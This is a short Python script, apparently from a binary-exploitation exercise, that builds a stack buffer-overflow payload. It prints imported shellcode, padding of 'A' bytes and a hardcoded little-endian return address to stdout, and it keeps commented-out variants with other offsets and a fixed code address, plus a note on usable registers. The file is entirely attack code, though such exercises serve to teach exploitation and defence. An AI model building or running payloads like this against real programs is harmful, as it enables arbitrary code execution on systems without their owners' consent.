#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode + ((2048-54+16)*b'A')+(0x7ffffff6d520).to_bytes(8,"little"))

#sys.stdout.buffer.write((0x810-54)*b'A'+shellcode+(8*b'A')+(0x0000000000401e02).to_bytes(8,"little"))
#sys.stdout.buffer.write((b'A'*2002)+shellcode+(0x0000000000401e02).to_bytes(8,"little"))

# need to write into a tmp register and then access 
# tmp: rbx, rdx, rcx, rdi, rsi